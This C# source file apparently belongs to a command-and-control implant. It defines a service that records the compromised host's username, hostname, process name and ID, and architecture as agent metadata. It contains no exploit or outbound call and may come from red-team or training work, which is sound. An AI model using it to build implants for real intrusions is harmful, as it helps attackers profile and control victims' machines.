using Implant.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Implant.Services
{
    public class AgentMetadataService
    {
        public static AgentMetadata GetMetada()
        {

            var process = Process.GetCurrentProcess();

            var metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Username = Environment.UserName,
                Hostname = Dns.GetHostName(),
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = "Medium",
                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
            };

            process.Dispose();
            return metadata;
        }
    }
}
